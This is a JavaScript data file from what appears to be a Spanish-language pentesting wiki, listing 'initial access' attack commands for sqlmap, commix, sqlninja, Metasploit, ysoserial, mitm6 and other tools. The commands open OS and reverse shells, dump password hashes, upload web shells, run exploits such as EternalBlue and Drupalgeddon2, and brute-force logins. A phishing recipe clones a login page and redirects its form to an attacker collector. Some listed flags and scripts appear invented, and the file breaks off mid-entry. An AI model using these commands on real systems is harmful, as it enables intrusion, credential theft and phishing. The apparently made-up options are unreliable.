// Acceso Inicial (Initial Access)
window.WIKI_CHEATSHEETS_03_INITIAL_ACCESS = [
 {
  "tool": "sqlmap",
  "desc": "Herramienta automatizada de detección y explotación de SQL Injection",
  "commands": [
   {
    "cmd": "sqlmap -u 'http://objetivo.com/page?id=1'",
    "desc": "Detección básica de SQLi"
   },
   {
    "cmd": "sqlmap -u 'http://objetivo.com/page?id=1' --batch",
    "desc": "Modo no interactivo (defaults)"
   },
   {
    "cmd": "sqlmap -u 'http://objetivo.com/page?id=1' --dbs",
    "desc": "Enumerar bases de datos"
   },
   {
    "cmd": "sqlmap -u 'http://objetivo.com/page?id=1' -D dbname --tables",
    "desc": "Enumerar tablas"
   },
   {
    "cmd": "sqlmap -u 'http://objetivo.com/page?id=1' -D dbname -T users --columns",
    "desc": "Enumerar columnas"
   },
   {
    "cmd": "sqlmap -u 'http://objetivo.com/page?id=1' -D dbname -T users --dump",
    "desc": "Volcar datos de la tabla"
   },
   {
    "cmd": "sqlmap -u 'http://objetivo.com/page?id=1' -D dbname -T users -C username,password --dump",
    "desc": "Columnas específicas"
   },
   {
    "cmd": "sqlmap -u 'http://objetivo.com/page?id=1' --dump-all",
    "desc": "Volcar toda la BD"
   },
   {
    "cmd": "sqlmap -u 'http://objetivo.com/page?id=1' --os-shell",
    "desc": "Obtener shell del sistema"
   },
   {
    "cmd": "sqlmap -u 'http://objetivo.com/page?id=1' --os-cmd=whoami",
    "desc": "Ejecutar un comando"
   },
   {
    "cmd": "sqlmap -u 'http://objetivo.com/page?id=1' --file-read=/etc/passwd",
    "desc": "Leer archivo del servidor"
   },
   {
    "cmd": "sqlmap -u 'http://objetivo.com/page?id=1' --file-write=shell.php --file-dest=/var/www/html/shell.php",
    "desc": "Subir archivo"
   },
   {
    "cmd": "sqlmap -r request.txt",
    "desc": "Usar request capturado de Burp"
   },
   {
    "cmd": "sqlmap -r request.txt -p id",
    "desc": "Parámetro a probar"
   },
   {
    "cmd": "sqlmap -u 'http://objetivo.com/page?id=1' --technique=BEU",
    "desc": "Técnicas: Boolean, Error, Union"
   },
   {
    "cmd": "sqlmap -u 'http://objetivo.com/page?id=1' --technique=T --time-sec=5",
    "desc": "Solo time-based con 5s"
   },
   {
    "cmd": "sqlmap -u 'http://objetivo.com/page?id=1' --level=5 --risk=3",
    "desc": "Máximo nivel y riesgo"
   },
   {
    "cmd": "sqlmap -u 'http://objetivo.com/page?id=1' --tamper=space2comment",
    "desc": "Tamper para evadir WAF"
   },
   {
    "cmd": "sqlmap -u 'http://objetivo.com/page?id=1' --tamper=between,randomcase",
    "desc": "Varios tampers"
   },
   {
    "cmd": "sqlmap -u 'http://objetivo.com/page?id=1' --random-agent",
    "desc": "User-Agent aleatorio"
   },
   {
    "cmd": "sqlmap -u 'http://objetivo.com/page?id=1' --threads=10",
    "desc": "10 hilos"
   },
   {
    "cmd": "sqlmap -u 'http://objetivo.com/page?id=1' --dbms=mysql",
    "desc": "Forzar DBMS"
   },
   {
    "cmd": "sqlmap -u 'http://objetivo.com/page?id=1' --dbms=mssql --os-shell",
    "desc": "OS shell en MSSQL"
   },
   {
    "cmd": "sqlmap -u 'http://objetivo.com/page?id=1' --current-db",
    "desc": "BD actual"
   },
   {
    "cmd": "sqlmap -u 'http://objetivo.com/page?id=1' --current-user",
    "desc": "Usuario actual"
   },
   {
    "cmd": "sqlmap -u 'http://objetivo.com/page?id=1' --is-dba",
    "desc": "¿Somos DBA?"
   },
   {
    "cmd": "sqlmap -u 'http://objetivo.com/page?id=1' --users --passwords",
    "desc": "Enumerar usuarios y hashes"
   },
   {
    "cmd": "sqlmap -u 'http://objetivo.com/page?id=1' --proxy=http://127.0.0.1:8080",
    "desc": "Proxy (Burp)"
   },
   {
    "cmd": "sqlmap -u 'http://objetivo.com/page?id=1' --tor --check-tor",
    "desc": "A través de Tor"
   },
   {
    "cmd": "sqlmap -u 'http://objetivo.com/page?id=1' --delay=2",
    "desc": "Delay entre peticiones"
   },
   {
    "cmd": "sqlmap -u 'http://objetivo.com/page?id=1' --batch --crawl=3",
    "desc": "Crawler + test de todos los parámetros"
   },
   {
    "cmd": "sqlmap -u 'http://objetivo.com/page?id=1' --forms",
    "desc": "Probar formularios"
   },
   {
    "cmd": "sqlmap -u 'http://objetivo.com/page?id=1' --cookie='session=abc'",
    "desc": "Con cookie de sesión"
   },
   {
    "cmd": "sqlmap -u 'http://objetivo.com/page?id=1' --headers='X-Forwarded-For: 1.2.3.4'",
    "desc": "Cabeceras custom"
   },
   {
    "cmd": "sqlmap -u 'http://objetivo.com/page?id=1' --data='user=admin&pass=123'",
    "desc": "POST data"
   },
   {
    "cmd": "sqlmap -u 'http://objetivo.com/page?id=1' --union-cols=5",
    "desc": "Fuerza de columnas UNION"
   },
   {
    "cmd": "sqlmap -u 'http://objetivo.com/page?id=1' --second-order='http://objetivo.com/respuesta'",
    "desc": "Inyección de segundo orden"
   },
   {
    "cmd": "sqlmap -u 'http://objetivo.com/page?id=1' --sql-shell",
    "desc": "Shell SQL interactiva"
   },
   {
    "cmd": "sqlmap -u 'http://objetivo.com/page?id=1' --keep-alive",
    "desc": "Mantener conexión viva"
   }
  ]
 },
 {
  "tool": "sqlninja",
  "desc": "Explotación avanzada de SQL Injection en MSSQL",
  "commands": [
   {
    "cmd": "sqlninja -f conf.txt",
    "desc": "Usar archivo de configuración"
   },
   {
    "cmd": "sqlninja -f conf.txt -m test",
    "desc": "Probar conectividad"
   },
   {
    "cmd": "sqlninja -f conf.txt -m fingerprint",
    "desc": "Fingerprint de la BD"
   },
   {
    "cmd": "sqlninja -f conf.txt -m brute",
    "desc": "Fuerza bruta de credenciales"
   },
   {
    "cmd": "sqlninja -f conf.txt -m escalate",
    "desc": "Escalar privilegios xp_cmdshell"
   },
   {
    "cmd": "sqlninja -f conf.txt -m backdoor",
    "desc": "Instalar backdoor"
   },
   {
    "cmd": "sqlninja -f conf.txt -m sqlsh",
    "desc": "Shell SQL"
   },
   {
    "cmd": "sqlninja -f conf.txt -m uploader",
    "desc": "Subir archivos"
   },
   {
    "cmd": "sqlninja -f conf.txt -m revshell",
    "desc": "Reverse shell"
   },
   {
    "cmd": "sqlninja -f conf.txt -m dnstool",
    "desc": "Herramientas DNS"
   }
  ]
 },
 {
  "tool": "sqlsus",
  "desc": "SQL injection tool orientada a MySQL (CLI interactiva)",
  "commands": [
   {
    "cmd": "sqlsus -u 'http://objetivo.com/page?id=1'",
    "desc": "Iniciar con URL"
   },
   {
    "cmd": "sqlsus -g config.conf -u URL",
    "desc": "Generar config desde URL"
   },
   {
    "cmd": "sqlsus -c config.conf",
    "desc": "Usar config existente"
   },
   {
    "cmd": "sqlsus -u URL -v 1",
    "desc": "Verbose"
   },
   {
    "cmd": "sqlsus -u URL --get-tables",
    "desc": "Enumerar tablas"
   },
   {
    "cmd": "sqlsus -u URL --get-columns db.tabla",
    "desc": "Enumerar columnas"
   },
   {
    "cmd": "sqlsus -u URL --dump-all",
    "desc": "Volcar todo"
   },
   {
    "cmd": "sqlsus -u URL --write-file shell.php",
    "desc": "Escribir archivo"
   },
   {
    "cmd": "sqlsus -u URL --read-file /etc/passwd",
    "desc": "Leer archivo"
   }
  ]
 },
 {
  "tool": "jsql",
  "desc": "Herramienta GUI de inyección SQL (Java)",
  "commands": [
   {
    "cmd": "jsql -u 'http://objetivo.com/page?id=1'",
    "desc": "Inyectar URL desde CLI"
   },
   {
    "cmd": "jsql --injection-type error",
    "desc": "Tipo de inyección"
   },
   {
    "cmd": "jsql -v",
    "desc": "Verbose"
   },
   {
    "cmd": "jsql --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "commix",
  "desc": "Automatizar la explotación de Command Injection",
  "commands": [
   {
    "cmd": "commix -u 'http://objetivo.com/page?cmd=id'",
    "desc": "Test básico"
   },
   {
    "cmd": "commix -u 'http://objetivo.com/page?cmd=id' --batch",
    "desc": "Modo batch"
   },
   {
    "cmd": "commix -u 'http://objetivo.com/page?cmd=id' --os=linux",
    "desc": "Forzar OS"
   },
   {
    "cmd": "commix -u 'http://objetivo.com/page?cmd=id' --technique=time",
    "desc": "Solo time-based"
   },
   {
    "cmd": "commix -u 'http://objetivo.com/page?cmd=id' --dbs",
    "desc": "Enumerar BD"
   },
   {
    "cmd": "commix -u 'http://objetivo.com/page?cmd=id' --os-shell",
    "desc": "Obtener shell"
   },
   {
    "cmd": "commix -u 'http://objetivo.com/page?cmd=id' --file-read=/etc/passwd",
    "desc": "Leer archivo"
   },
   {
    "cmd": "commix -u 'http://objetivo.com/page?cmd=id' --file-write=sh.php --file-dest=/tmp/sh.php",
    "desc": "Escribir archivo"
   },
   {
    "cmd": "commix -r request.txt",
    "desc": "Desde request de Burp"
   },
   {
    "cmd": "commix -u 'http://objetivo.com/page?cmd=id' --level=2",
    "desc": "Nivel 2"
   },
   {
    "cmd": "commix -u 'http://objetivo.com/page?cmd=id' --cookie='sess=1'",
    "desc": "Con cookies"
   },
   {
    "cmd": "commix -u 'http://objetivo.com/page?cmd=id' --tamper=space2comment",
    "desc": "Tamper WAF"
   },
   {
    "cmd": "commix -u 'http://objetivo.com/page?cmd=id' --proxy=127.0.0.1:8080",
    "desc": "Proxy"
   },
   {
    "cmd": "commix -u 'http://objetivo.com/page?cmd=id' --random-agent",
    "desc": "Random user-agent"
   },
   {
    "cmd": "commix -u 'http://objetivo.com/page?cmd=id' --time-sec=10",
    "desc": "Timebase 10s"
   }
  ]
 },
 {
  "tool": "gophish",
  "desc": "Framework open source de phishing para campañas",
  "commands": [
   {
    "cmd": "gophish",
    "desc": "Iniciar servidor (puerto 3333 admin)"
   },
   {
    "cmd": "gophish --port 8080",
    "desc": "Puerto del admin panel"
   },
   {
    "cmd": "gophish --phish-port 80",
    "desc": "Puerto de phishing"
   },
   {
    "cmd": "gophish --domain mail.objetivo.com",
    "desc": "Dominio de hosting"
   },
   {
    "cmd": "gophish --setup-path /tmp/setup",
    "desc": "Config inicial"
   },
   {
    "cmd": "gophish --config config.json",
    "desc": "Config personalizada"
   }
  ]
 },
 {
  "tool": "beef-xss",
  "desc": "Browser Exploitation Framework - control de navegadores vía XSS",
  "commands": [
   {
    "cmd": "beef-xss",
    "desc": "Iniciar BeEF (panel en :3000)"
   },
   {
    "cmd": "beef-xss-stop",
    "desc": "Detener BeEF"
   },
   {
    "cmd": "beef-xss-start",
    "desc": "Iniciar BeEF"
   },
   {
    "cmd": "beef -x",
    "desc": "Iniciar headless"
   },
   {
    "cmd": "beef -c config.yaml",
    "desc": "Con configuración custom"
   },
   {
    "cmd": "beef --no-colour",
    "desc": "Sin colores"
   }
  ]
 },
 {
  "tool": "metasploit-framework",
  "desc": "Framework de explotación líder (Metasploit)",
  "commands": [
   {
    "cmd": "msfconsole",
    "desc": "Iniciar consola interactiva"
   },
   {
    "cmd": "msfconsole -q",
    "desc": "Inicio rápido sin banner"
   },
   {
    "cmd": "msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; run'",
    "desc": "Ejecutar comandos al inicio"
   },
   {
    "cmd": "msfconsole -r script.rc",
    "desc": "Ejecutar resource script"
   },
   {
    "cmd": "msfconsole -L",
    "desc": "Usar plugin de la comunidad"
   },
   {
    "cmd": "msfconsole -o output.txt",
    "desc": "Log de salida"
   },
   {
    "cmd": "msfdb init",
    "desc": "Inicializar la base de datos"
   },
   {
    "cmd": "msfdb start",
    "desc": "Iniciar la BD"
   },
   {
    "cmd": "msfdb status",
    "desc": "Estado de la BD"
   },
   {
    "cmd": "msfdb reinit",
    "desc": "Reinicializar BD"
   },
   {
    "cmd": "msfupdate",
    "desc": "Actualizar framework"
   },
   {
    "cmd": "msfvenom -l payloads",
    "desc": "Listar payloads"
   },
   {
    "cmd": "msfconsole -x 'search eternalblue'",
    "desc": "Buscar exploit"
   },
   {
    "cmd": "msfconsole -x 'search type:exploit name:apache'",
    "desc": "Búsqueda filtrada"
   },
   {
    "cmd": "msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue'",
    "desc": "Usar exploit directo"
   },
   {
    "cmd": "msfconsole -x 'info exploit/multi/handler'",
    "desc": "Info de módulo"
   },
   {
    "cmd": "msfconsole -x 'workspace -a nombre'",
    "desc": "Crear workspace"
   },
   {
    "cmd": "msfconsole -x 'db_nmap -sV 192.168.1.10'",
    "desc": "Nmap dentro de msf"
   },
   {
    "cmd": "msfconsole -x 'hosts'",
    "desc": "Ver hosts en BD"
   },
   {
    "cmd": "msfconsole -x 'services'",
    "desc": "Ver servicios en BD"
   },
   {
    "cmd": "msfconsole -x 'vulns'",
    "desc": "Ver vulnerabilidades"
   },
   {
    "cmd": "msfconsole -x 'creds'",
    "desc": "Ver credenciales"
   },
   {
    "cmd": "msfconsole -x 'use auxiliary/scanner/portscan/tcp; set RHOSTS 192.168.1.0/24; run'",
    "desc": "Portscan con auxiliar"
   },
   {
    "cmd": "msfconsole -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.1.10; run'",
    "desc": "Version SMB"
   },
   {
    "cmd": "msfconsole -x 'use auxiliary/sniffer/psnuffle; run'",
    "desc": "Sniffer psnuffle"
   },
   {
    "cmd": "msfconsole -x 'use auxiliary/server/socks4a; run'",
    "desc": "Servidor SOCKS4a"
   },
   {
    "cmd": "msfconsole -x 'use auxiliary/server/capture/http_basic; run'",
    "desc": "Capturar credenciales HTTP"
   },
   {
    "cmd": "msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST IP; set LPORT 4444; exploit'",
    "desc": "Handler de Meterpreter"
   },
   {
    "cmd": "msfconsole -x 'use auxiliary/scanner/http/http_version; set RHOSTS objetivo.com; run'",
    "desc": "Scanner HTTP"
   },
   {
    "cmd": "msfconsole -x 'use post/multi/recon/local_exploit_suggester; set SESSION 1; run'",
    "desc": "Sugerir exploits locales"
   },
   {
    "cmd": "msfconsole -x 'use post/windows/gather/hashdump; set SESSION 1; run'",
    "desc": "Volcar hashes"
   },
   {
    "cmd": "msfconsole -x 'use exploit/multi/script/web_delivery; set TARGET 2; set PAYLOAD windows/meterpreter/reverse_tcp; run'",
    "desc": "Web delivery"
   },
   {
    "cmd": "msfconsole -x 'use auxiliary/scanner/smb/pipe_auditor; set RHOSTS 192.168.1.10; run'",
    "desc": "Pipe auditor SMB"
   }
  ]
 },
 {
  "tool": "dns-rebind",
  "desc": "Herramienta de DNS rebinding para atacar aplicaciones web",
  "commands": [
   {
    "cmd": "dns-rebind -h",
    "desc": "Ayuda"
   },
   {
    "cmd": "dns-rebind --server 127.0.0.1:5353",
    "desc": "Servidor DNS local"
   },
   {
    "cmd": "dns-rebind --target 127.0.0.1",
    "desc": "Target de rebinding"
   },
   {
    "cmd": "dns-rebind --port 80",
    "desc": "Puerto objetivo"
   },
   {
    "cmd": "dns-rebind --attack-ip 192.168.1.100",
    "desc": "IP de ataque"
   },
   {
    "cmd": "dns-rebind --victim-ip 127.0.0.1",
    "desc": "IP víctima"
   }
  ]
 },
 {
  "tool": "jboss-autopwn",
  "desc": "Explotar servidores JBoss sin autenticación",
  "commands": [
   {
    "cmd": "jboss-linux",
    "desc": "Explotar JBoss en Linux"
   },
   {
    "cmd": "jboss-win",
    "desc": "Explotar JBoss en Windows"
   },
   {
    "cmd": "jboss-linux --help",
    "desc": "Ayuda"
   },
   {
    "cmd": "jboss-win --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "ysoserial",
  "desc": "Generador de payloads de deserialización Java",
  "commands": [
   {
    "cmd": "java -jar ysoserial.jar CommonsCollections1 'cmd'",
    "desc": "Payload CC1"
   },
   {
    "cmd": "java -jar ysoserial.jar CommonsCollections4 'cmd'",
    "desc": "CC4"
   },
   {
    "cmd": "java -jar ysoserial.jar CommonsCollections5 'cmd'",
    "desc": "CC5"
   },
   {
    "cmd": "java -jar ysoserial.jar CommonsCollections6 'cmd'",
    "desc": "CC6"
   },
   {
    "cmd": "java -jar ysoserial.jar CommonsCollections7 'cmd'",
    "desc": "CC7"
   },
   {
    "cmd": "java -jar ysoserial.jar CommonsBeanutils1 'cmd'",
    "desc": "CB1"
   },
   {
    "cmd": "java -jar ysoserial.jar Jdk7u21 'cmd'",
    "desc": "JDK7u21"
   },
   {
    "cmd": "java -jar ysoserial.jar Groovy1 'cmd'",
    "desc": "Groovy"
   },
   {
    "cmd": "java -jar ysoserial.jar Spring1 'cmd'",
    "desc": "Spring1"
   },
   {
    "cmd": "java -jar ysoserial.jar URLDNS 'http://dnslog'",
    "desc": "DNS exfil"
   },
   {
    "cmd": "java -jar ysoserial.jar JRMPClient IP:port",
    "desc": "JRMP client"
   },
   {
    "cmd": "java -jar ysoserial.jar JRMPListener port",
    "desc": "JRMP listener"
   },
   {
    "cmd": "java -jar ysoserial.jar -g URLDNS -p raw",
    "desc": "Gadget+payload"
   },
   {
    "cmd": "java -jar ysoserial.jar --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "jdwp-shellifier",
  "desc": "Explotar JDWP (Java Debug Wire Protocol) para RCE",
  "commands": [
   {
    "cmd": "python3 jdwp-shellifier.py -t IP -p 8000",
    "desc": "Detectar JDWP"
   },
   {
    "cmd": "python3 jdwp-shellifier.py -t IP -p 8000 --cmd 'whoami'",
    "desc": "Ejecutar comando"
   },
   {
    "cmd": "python3 jdwp-shellifier.py -t IP -p 8000 --break-on 'java.lang.String.indexOf'",
    "desc": "Breakpoint"
   },
   {
    "cmd": "python3 jdwp-shellifier.py -t IP -p 8000 --cmd 'id' --timeout 5",
    "desc": "Timeout"
   },
   {
    "cmd": "python3 jdwp-shellifier.py -t IP -p 8000 -v",
    "desc": "Verbose"
   },
   {
    "cmd": "python3 jdwp-shellifier.py -t IP -p 8000 --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "drupwn",
  "desc": "Enumerator y explotador de Drupal",
  "commands": [
   {
    "cmd": "drupwn --mode enumerate --target http://IP",
    "desc": "Enumerar"
   },
   {
    "cmd": "drupwn --mode exploit --target http://IP",
    "desc": "Explotar"
   },
   {
    "cmd": "drupwn --mode enumerate --target URL --users",
    "desc": "Usuarios"
   },
   {
    "cmd": "drupwn --mode enumerate --target URL --modules",
    "desc": "Módulos"
   },
   {
    "cmd": "drupwn --mode enumerate --target URL --themes",
    "desc": "Temas"
   },
   {
    "cmd": "drupwn --mode enumerate --target URL --version",
    "desc": "Versión"
   },
   {
    "cmd": "drupwn --mode exploit --target URL --exploit drupalgeddon2",
    "desc": "Drupalgeddon2"
   },
   {
    "cmd": "drupwn --mode exploit --target URL --exploit user_enum",
    "desc": "User enum"
   },
   {
    "cmd": "drupwn --mode exploit --target URL -a",
    "desc": "Autenticación"
   },
   {
    "cmd": "drupwn --mode exploit --target URL --shell",
    "desc": "Shell"
   },
   {
    "cmd": "drupwn -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "droopescan",
  "desc": "Scanner de Drupal/WordPress/joomla/silverstripe",
  "commands": [
   {
    "cmd": "droopescan scan drupal -u http://IP",
    "desc": "Scan drupal"
   },
   {
    "cmd": "droopescan scan drupal -u URL --enumerate all",
    "desc": "Enumerar todo"
   },
   {
    "cmd": "droopescan scan drupal -u URL --enumerate u",
    "desc": "Usuarios"
   },
   {
    "cmd": "droopescan scan drupal -u URL --enumerate m",
    "desc": "Módulos"
   },
   {
    "cmd": "droopescan scan drupal -u URL --enumerate t",
    "desc": "Themes"
   },
   {
    "cmd": "droopescan scan drupal -u URL --enumerate v",
    "desc": "Versión"
   },
   {
    "cmd": "droopescan scan drupal -u URL --threads 10",
    "desc": "Hilos"
   },
   {
    "cmd": "droopescan scan drupal -u URL --proxy http://proxy:8080",
    "desc": "Proxy"
   },
   {
    "cmd": "droopescan scan wordpress -u URL",
    "desc": "WordPress"
   },
   {
    "cmd": "droopescan scan joomla -u URL",
    "desc": "Joomla"
   },
   {
    "cmd": "droopescan scan silverstripe -u URL",
    "desc": "Silverstripe"
   },
   {
    "cmd": "droopescan -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "cve-search",
  "desc": "Búsqueda offline de CVEs (bases de datos locales)",
  "commands": [
   {
    "cmd": "cve-search -p apache -p httpd",
    "desc": "Buscar por producto"
   },
   {
    "cmd": "cve-search -p apache -v 2.4.49",
    "desc": "Versión"
   },
   {
    "cmd": "cve-search -c CVE-2021-41773",
    "desc": "Por CVE"
   },
   {
    "cmd": "cve-search -p apache -o json",
    "desc": "JSON"
   },
   {
    "cmd": "cve-search -p apache -l 10",
    "desc": "Límite 10"
   },
   {
    "cmd": "cve-search -p apache -s 2.4.49",
    "desc": "Search"
   },
   {
    "cmd": "cve-search -x",
    "desc": "Exploitable"
   },
   {
    "cmd": "cve-search -n",
    "desc": "NVD"
   },
   {
    "cmd": "cve-search -u",
    "desc": "Update DB"
   },
   {
    "cmd": "cve-search -h",
    "desc": "Ayuda"
   },
   {
    "cmd": "cve-search -p apache -f exploits",
    "desc": "Con exploits"
   }
  ]
 },
 {
  "tool": "mitm6",
  "desc": "Relay de DHCPv6 para ataques a AD (wpad-spoofing)",
  "commands": [
   {
    "cmd": "mitm6 -d dom.local",
    "desc": "Spoof DHCPv6"
   },
   {
    "cmd": "mitm6 -d dom.local -i eth0",
    "desc": "Interfaz"
   },
   {
    "cmd": "mitm6 -d dom.local -p 666",
    "desc": "Puerto"
   },
   {
    "cmd": "mitm6 -d dom.local -w wpad.db",
    "desc": "WPAD file"
   },
   {
    "cmd": "mitm6 -d dom.local -r",
    "desc": "Relay"
   },
   {
    "cmd": "mitm6 -d dom.local -a IP",
    "desc": "Attack IP"
   },
   {
    "cmd": "mitm6 -d dom.local -v",
    "desc": "Verbose"
   },
   {
    "cmd": "mitm6 -d dom.local -l",
    "desc": "Log"
   },
   {
    "cmd": "mitm6 -d dom.local -h",
    "desc": "Ayuda"
   },
   {
    "cmd": "mitm6 -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "evil-ssdp",
  "desc": "Spoofing SSDP para servir webshells en red local",
  "commands": [
   {
    "cmd": "evil-ssdp.py -w wp",
    "desc": "Modo windows phone"
   },
   {
    "cmd": "evil-ssdp.py -a",
    "desc": "Android"
   },
   {
    "cmd": "evil-ssdp.py -w -p 8080",
    "desc": "Puerto"
   },
   {
    "cmd": "evil-ssdp.py -w -l 10.0.0.1",
    "desc": "IP local"
   },
   {
    "cmd": "evil-ssdp.py -w -s",
    "desc": "Silent"
   },
   {
    "cmd": "evil-ssdp.py -w -v",
    "desc": "Verbose"
   },
   {
    "cmd": "evil-ssdp.py -w -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "nmap-vuln-scan",
  "desc": "Escaneo de vulnerabilidades con Nmap NSE",
  "commands": [
   {
    "cmd": "nmap --script=vuln -p- IP",
    "desc": "Todos los puertos"
   },
   {
    "cmd": "nmap --script=vulners -sV IP",
    "desc": "CVE lookup"
   },
   {
    "cmd": "nmap --script=exploit -p- IP",
    "desc": "Intento de explotación"
   },
   {
    "cmd": "nmap --script=smb-vuln-ms17-010 -p445 IP",
    "desc": "MS17-010"
   },
   {
    "cmd": "nmap --script=smb-vuln-ms08-067 -p445 IP",
    "desc": "MS08-067"
   },
   {
    "cmd": "nmap --script=http-vuln-cve2017-5638 -p80 IP",
    "desc": "Struts2"
   },
   {
    "cmd": "nmap --script=ftp-vsftpd-backdoor -p21 IP",
    "desc": "vsftpd"
   },
   {
    "cmd": "nmap --script=ssh-vuln-cve2012-5970 -p22 IP",
    "desc": "SSH CVE"
   },
   {
    "cmd": "nmap --script=rdp-vuln-ms12-020 -p3389 IP",
    "desc": "RDP"
   },
   {
    "cmd": "nmap --script=http-vuln-cve2014-3704 -p80 IP",
    "desc": "Drupal"
   },
   {
    "cmd": "nmap --script=ssl-poodle -p443 IP",
    "desc": "POODLE"
   },
   {
    "cmd": "nmap --script=ssl-dh-params -p443 IP",
    "desc": "DH params"
   },
   {
    "cmd": "nmap --script=mysql-vuln-cve2012-2122 -p3306 IP",
    "desc": "MySQL CVE"
   },
   {
    "cmd": "nmap --script=realvnc-auth-bypass -p5900 IP",
    "desc": "VNC"
   },
   {
    "cmd": "nmap --script=superfluous -p80 IP",
    "desc": "Superfluous"
   },
   {
    "cmd": "nmap --script=default,vuln -sV -p- IP",
    "desc": "Combo"
   }
  ]
 },
 {
  "tool": "exploitdb-lookup",
  "desc": "Consultas a ExploitDB (searchsploit alt)",
  "commands": [
   {
    "cmd": "searchsploit --web apache",
    "desc": "Buscar en web"
   },
   {
    "cmd": "exploitdb -q 'Microsoft Exchange'",
    "desc": "Query"
   },
   {
    "cmd": "exploitdb -q 'RCE 2021'",
    "desc": "RCE 2021"
   },
   {
    "cmd": "exploitdb -q 'kernel 4.4'",
    "desc": "Kernel"
   },
   {
    "cmd": "exploitdb -q 'Local Privilege Escalation' -t",
    "desc": "Por título"
   },
   {
    "cmd": "exploitdb -s 'CVE-2021-41773'",
    "desc": "Por CVE"
   },
   {
    "cmd": "exploitdb -p 50383",
    "desc": "Path"
   },
   {
    "cmd": "exploitdb --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "routerpwn-scan",
  "desc": "Escaneo de routers y dispositivos IoT",
  "commands": [
   {
    "cmd": "routerpwn -t 192.168.1.1",
    "desc": "Escanear router"
   },
   {
    "cmd": "routerpwn -t IP -p 80,443,8080",
    "desc": "Puertos"
   },
   {
    "cmd": "routerpwn -t IP -o out.txt",
    "desc": "Salida"
   },
   {
    "cmd": "routerpwn -t IP -v",
    "desc": "Verbose"
   },
   {
    "cmd": "routerpwn -t IP -q",
    "desc": "Quiet"
   },
   {
    "cmd": "routerpwn -t IP -c 20",
    "desc": "Concurrencia"
   },
   {
    "cmd": "routerpwn -t IP --default-creds",
    "desc": "Credenciales default"
   },
   {
    "cmd": "routerpwn -t IP --cve-check",
    "desc": "CVE check"
   },
   {
    "cmd": "routerpwn -t IP --firmware-check",
    "desc": "Firmware"
   },
   {
    "cmd": "routerpwn -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "metasploit-access",
  "desc": "Módulos Metasploit de acceso inicial",
  "commands": [
   {
    "cmd": "msfconsole -q -x 'use exploit/multi/http/wp_admin_shell_upload; set RHOSTS IP; set USERNAME admin; set PASSWORD pass; run'",
    "desc": "WP upload"
   },
   {
    "cmd": "msfconsole -q -x 'use exploit/linux/http/vmware_vcenter_uploadova_rce_2021; set RHOSTS IP; run'",
    "desc": "vCenter"
   },
   {
    "cmd": "msfconsole -q -x 'use exploit/unix/webapp/tikiwiki_graph_formula_exec; set RHOSTS IP; run'",
    "desc": "TikiWiki"
   },
   {
    "cmd": "msfconsole -q -x 'use exploit/multi/http/atlassian_confluence_webwork_ognl_injection; set RHOSTS IP; run'",
    "desc": "Confluence"
   },
   {
    "cmd": "msfconsole -q -x 'use auxiliary/scanner/http/tomcat_mgr_login; set RHOSTS IP; run'",
    "desc": "Tomcat login"
   },
   {
    "cmd": "msfconsole -q -x 'use auxiliary/scanner/http/wordpress_login_enum; set RHOSTS IP; run'",
    "desc": "WP enum"
   },
   {
    "cmd": "msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; set RHOSTS IP; set USER_FILE users.txt; set PASS_FILE pass.txt; run'",
    "desc": "SSH login"
   },
   {
    "cmd": "msfconsole -q -x 'use auxiliary/scanner/ftp/ftp_login; set RHOSTS IP; run'",
    "desc": "FTP login"
   },
   {
    "cmd": "msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_login; set RHOSTS IP; run'",
    "desc": "SMTP login"
   },
   {
    "cmd": "msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_login; set RHOSTS IP; run'",
    "desc": "MySQL login"
   },
   {
    "cmd": "msfconsole -q -x 'use auxiliary/scanner/postgres/postgres_login; set RHOSTS IP; run'",
    "desc": "Postgres login"
   },
   {
    "cmd": "msfconsole -q -x 'use auxiliary/scanner/smb/smb_login; set RHOSTS IP; run'",
    "desc": "SMB login"
   },
   {
    "cmd": "msfconsole -q -x 'use auxiliary/scanner/rdp/rdp_scanner; set RHOSTS IP; run'",
    "desc": "RDP scan"
   },
   {
    "cmd": "msfconsole -q -x 'use auxiliary/scanner/vnc/vnc_login; set RHOSTS IP; run'",
    "desc": "VNC login"
   },
   {
    "cmd": "msfconsole -q -x 'use auxiliary/scanner/telnet/telnet_login; set RHOSTS IP; run'",
    "desc": "Telnet login"
   },
   {
    "cmd": "msfconsole -q -x 'use auxiliary/scanner/snmp/snmp_login; set RHOSTS IP; run'",
    "desc": "SNMP login"
   }
  ]
 },
 {
  "tool": "phishing-harvest",
  "desc": "Harvesting de credenciales",
  "commands": [
   {
    "cmd": "wget -r -np -k http://target.com/login -P /tmp/clone",
    "desc": "Clonar"
   },
   {
    "cmd": "sed -i 's/action=\"login\"/action=\"http://IP/collect\"/' /tmp/clone/login.html",
    "desc": "Redirigir form"
   },
   {
    "cmd": "grep -rn 'type=\"password\"' /tmp/clone/",
    "desc": "Buscar pass fields"
   },
   {
    "cmd": "python3 -m http.server 80 -d /tmp/clone",
    "desc": "Servir"
   },
   {
    "cmd": "msfconsole -q -x 'use auxiliary/server/capture/http_basic; set SRVHOST IP; set SRVPORT 80; run -j'",
    "desc": "Capturar"
   },
   {
    "cmd": "setoolkit",
    "desc": "SET"
   },
   {
    "cmd": "beef-xss -c /etc/beef-xss/config.yaml",
    "desc": "BeEF"
   },
   {
    "cmd": "gophish",
    "desc": "Gophish"
   },
   {
    "cmd": "curl -s -X POST http://IP/collect -d 'user=admin&pass=test'",
    "desc": "Probar collector"
   },
   {
    "cmd": "tail -f /var/log/nginx/access.log",
    "desc": "Ver accesos"
   },
   {
